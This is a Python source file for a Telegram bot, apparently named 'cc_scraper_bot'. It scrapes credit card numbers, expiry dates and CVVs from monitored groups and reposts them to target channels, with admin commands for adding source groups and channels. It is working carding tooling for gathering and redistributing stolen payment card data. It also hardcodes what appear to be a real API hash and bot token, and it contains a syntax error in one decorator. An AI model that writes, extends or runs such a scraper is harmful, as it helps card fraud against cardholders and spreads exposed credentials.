import re
import asyncio
import logging
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ParseMode

# =========== CONFIGURATION ===========
API_ID = 28232616
API_HASH = "82e6373f14a917289086553eefc64afe"
BOT_TOKEN = "8039426526:AAFSqWU-fRl_gwTPqYLK8yxuS0N9at1hC4s"

SOURCE_GROUPS = [-1002854404728]  # Default source group
TARGET_CHANNELS = [-1002557527694, -1002881804094]  # Default target channels

ADMIN_ID = 5387926427  # Your Telegram user ID
WELCOME_IMAGE = "https://cdn.nekos.life/neko/neko370.jpeg"
# =====================================

logging.basicConfig(level=logging.INFO)
app = Client("cc_scraper_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Track groups where bot is actually admin
VERIFIED_GROUPS = set()

# ========== Helper Functions ==========
def extract_credit_cards(text):
    pattern = r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'
    return re.findall(pattern, text or "")

def format_card_message(cc):
    card_number, month, year, cvv = cc
    return f"Card: <code>{card_number}|{month}|{year}|{cvv}</code>\n"

async def delete_after_delay(message, delay=120):
    await asyncio.sleep(delay)
    try:
        await message.delete()
    except Exception as e:
        logging.warning(f"Error deleting message: {e}")

async def is_bot_admin(chat_id):
    try:
        me = await app.get_chat_member(chat_id, "me")
        return me.privileges and me.privileges.can_delete_messages
    except:
        return False

async def reply_to_user(message: Message, text: str, reply_to_message=True):
    """Helper function to reply to user with their mention"""
    if reply_to_message:
        await message.reply(text)
    else:
        await app.send_message(
            message.from_user.id,
            text,
            reply_to_message_id=message.id
        )

# ========== Command Handlers ==========
@app.on_message(filters.command("start"))
async def start_command(client, message: Message):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add to Group", url=f"https://t.me/{app.me.username}?startgroup=true")],
        [InlineKeyboardButton("🆔 Get Group ID", callback_data="get_group_id")]
    ])
    
    await message.reply_photo(
        photo=WELCOME_IMAGE,
        caption="✅ Welcome to @Test_090bot!\n\nAdd me to your group as an admin to start.\n\nFor any issues, contact: @approvedccm_bot",
        reply_markup=keyboard
    )

@app.on_message(filters.command("id"))
async def get_id_command(client, message: Message):
    chat_id = message.chat.id
    await reply_to_user(message, f"👥 Chat ID: <code>{chat_id}</code>")

@app.on_callback_query(filters.regex("^get_group_id$"))
async def get_group_id_callback(client, callback_query):
    await callback_query.answer()
    await reply_to_user(callback_query.message, 
        "👥 Please follow these steps:\n"
        "1. Add me to your group.\n"
        "2. Make me an admin (with delete permissions).\n"
        "3. Send me the Group ID here (just paste it in this chat).\n"
        "4. I will verify my admin status before accepting.\n\n"
        "To get your Group ID, go to your group and send the /id command, then copy the ID and send it here.\n\n"
        "For any issues, contact: @approvedccm_bot",
        reply_to_message=False
    )

# Handle when users send their group ID
@app.on_message(filters.regex(r'^-?\d+$') & filters.private & ~filters.command(["start", "id"]))
async def handle_group_id_submission(client, message: Message):
    group_id = int(message.text)
    
    # Check if group is already added
    if group_id in SOURCE_GROUPS:
        await reply_to_user(message, f"ℹ️ Group <code>{group_id}</code> is already in the source list.")
        return
    
    # Check if bot is admin in the group
    is_admin = await is_bot_admin(group_id)
    
    if is_admin:
        SOURCE_GROUPS.append(group_id)
        VERIFIED_GROUPS.add(group_id)
        await reply_to_user(message, f"✅ Group <code>{group_id}</code> verified and added to source list!")
        await app.send_message(
            ADMIN_ID,
            f"📨 New group added automatically:\n\n"
            f"Group ID: <code>{group_id}</code>\n"
            f"Added by: {message.from_user.mention}\n"
            f"User ID: <code>{message.from_user.id}</code>",
            parse_mode=ParseMode.HTML
        )
    else:
        await reply_to_user(message, f"❌ I'm not admin in group <code>{group_id}</code> or can't verify. Please make me admin first.")
        await app.send_message(
            ADMIN_ID,
            f"⚠️ Group submission failed verification:\n\n"
            f"Group ID: <code>{group_id}</code>\n"
            f"Submitted by: {message.from_user.mention}\n"
            f"User ID: <code>{message.from_user.id}</code>\n\n"
            f"Bot is not admin in this group.",
            parse_mode=ParseMode.HTML
        )

# ========== Admin Commands ==========
@app.on_message(filters.command("addgroup") & filters.user(ADMIN_ID))
async def add_source_group(client, message: Message):
    if len(message.command) < 2:
        await reply_to_user(message, "Usage: /addgroup <group_id>")
        return
    
    try:
        group_id = int(message.command[1])
        if group_id in SOURCE_GROUPS:
            await reply_to_user(message, f"ℹ️ Group <code>{group_id}</code> is already in the source list.")
            return
            
        SOURCE_GROUPS.append(group_id)
        # Verify admin status
        if await is_bot_admin(group_id):
            VERIFIED_GROUPS.add(group_id)
            status = "and verified"
        else:
            status = "but not verified (bot not admin)"
            
        await reply_to_user(message, f"✅ Added source group <code>{group_id}</code> {status}")
    except ValueError:
        await reply_to_user(message, "❌ Invalid group ID. Please provide a numeric ID.")

@app.on_message(filters.command("removegroup") & filters.user(ADMIN_ID))
async def remove_source_group(client, message: Message):
    if len(message.command) < 2:
        await reply_to_user(message, "Usage: /removegroup <group_id>")
        return
    
    try:
        group_id = int(message.command[1])
        if group_id in SOURCE_GROUPS:
            SOURCE_GROUPS.remove(group_id)
            if group_id in VERIFIED_GROUPS:
                VERIFIED_GROUPS.remove(group_id)
            await reply_to_user(message, f"✅ Removed source group: <code>{group_id}</code>")
        else:
            await reply_to_user(message, f"ℹ️ Group <code>{group_id}</code> is not in the source list.")
    except ValueError:
        await reply_to_user(message, "❌ Invalid group ID. Please provide a numeric ID.")

@app.on_message(filters.command("listgroups") & filters.user(ADMIN_ID))
async def list_source_groups(client, message: Message):
    if not SOURCE_GROUPS:
        await reply_to_user(message, "❌ No source groups configured.")
        return
    
    groups_list = []
    for group_id in SOURCE_GROUPS:
        status = "✅ Verified" if group_id in VERIFIED_GROUPS else "⚠️ Unverified"
        groups_list.append(f"• <code>{group_id}</code> - {status}")
    
    await reply_to_user(message,
        f"📋 Source Groups ({len(SOURCE_GROUPS)}):\n\n" + "\n".join(groups_list),
        parse_mode=ParseMode.HTML
    )

@app.on_message(filters.command("addchannel") & filters.user(ADMIN_ID))
async def add_target_channel(client, message: Message):
    if len(message.command) < 2:
        await reply_to_user(message, "Usage: /addchannel <channel_id>")
        return
    
    try:
        channel_id = int(message.command[1])
        if channel_id in TARGET_CHANNELS:
            await reply_to_user(message, f"ℹ️ Channel <code>{channel_id}</code> is already in the target list.")
            return
            
        TARGET_CHANNELS.append(channel_id)
        await reply_to_user(message, f"✅ Added target channel: <code>{channel_id}</code>")
    except ValueError:
        await reply_to_user(message, "❌ Invalid channel ID. Please provide a numeric ID.")

@app.on_message(filters.command("removechannel") & filters.user(ADMIN_ID))
async def remove_target_channel(client, message: Message):
    if len(message.command) < 2:
        await reply_to_user(message, "Usage: /removechannel <channel_id>")
        return
    
    try:
        channel_id = int(message.command[1])
        if channel_id in TARGET_CHANNELS:
            TARGET_CHANNELS.remove(channel_id)
            await reply_to_user(message, f"✅ Removed target channel: <code>{channel_id}</code>")
        else:
            await reply_to_user(message, f"ℹ️ Channel <code>{channel_id}</code> is not in the target list.")
    except ValueError:
        await reply_to_user(message, "❌ Invalid channel ID. Please provide a numeric ID.")

@app.on_message(filters.command("listchannels") & filters.user(ADMIN_ID))
async def list_target_channels(client, message: Message):
    if not TARGET_CHANNELS:
        await reply_to_user(message, "❌ No target channels configured.")
        return
    
    channels_list = "\n".join([f"• <code>{channel_id}</code>" for channel_id in TARGET_CHANNELS])
    await reply_to_user(message,
        f"📋 Target Channels ({len(TARGET_CHANNELS)}):\n\n{channels_list}",
        parse_mode=ParseMode.HTML
    )

# ========== Main CC Scraper ==========
@app.on_message(filters.chat(SOURCE_GROUPS))
async def cc_scraper(client, message: Message):
    # Only process if bot is admin in this group
    if message.chat.id not in VERIFIED_GROUPS:
        return
        
    text = message.text or message.caption
    cards = extract_credit_cards(text)
    if not cards:
        return

    for cc in cards:
        msg_text = format_card_message(cc)
        for channel in TARGET_CHANNELS:
            try:
                sent = await app.send_message(
                    channel,
                    msg_text,
                    parse_mode=ParseMode.HTML,
                    reply_to_message_id=message.id
                )
                asyncio.create_task(delete_after_delay(sent))
            except Exception as e:
                logging.warning(f"Error sending/deleting message in {channel}: {e}")

# Check admin status when added to new group
@app.on_message(filters.new_chat_members))
async def new_chat_handler(client, message: Message):
    if app.me.id in [user.id for user in message.new_chat_members]:
        chat_id = message.chat.id
        is_admin = await is_bot_admin(chat_id)
        
        if is_admin and chat_id not in VERIFIED_GROUPS:
            VERIFIED_GROUPS.add(chat_id)
            if chat_id not in SOURCE_GROUPS:
                SOURCE_GROUPS.append(chat_id)
                await message.reply("✅ Bot added as admin! This group is now verified and added to source list.")
        elif not is_admin:
            await message.reply("⚠️ Please make me admin with delete permissions to enable scraping.")

# ========== Run the Bot ==========
print("✅ Bot is running. Press Ctrl+C to stop.")
app.run()
